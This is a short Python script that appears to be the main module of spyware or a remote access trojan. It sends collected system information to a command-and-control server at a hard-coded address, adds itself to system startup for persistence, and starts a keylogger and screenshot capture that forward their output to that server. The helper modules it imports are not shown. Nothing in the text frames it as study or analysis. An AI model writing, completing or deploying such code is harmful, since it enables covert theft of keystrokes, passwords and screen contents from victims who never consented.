import requests
from persistence import add_to_startup
from keylogger import start_keylogger
from screenshot import capture_screenshot
from system_info import collect_system_info

C2_SERVER = "http://192.168.0.122:5000"

def send_data(data):
    try:
        response = requests.post(f"{C2_SERVER}/receive", json=data)
        return response.status_code
    except Exception as e:
        print(f"Error sending data: {e}")
        return None

if __name__ == "__main__":
    # Collect and send system information
    system_info = collect_system_info()
    send_data(system_info)

    # Setup persistence
    add_to_startup(__file__)

    # Start keylogger
    start_keylogger(send_data)

    # Capture screenshot
    capture_screenshot(send_data)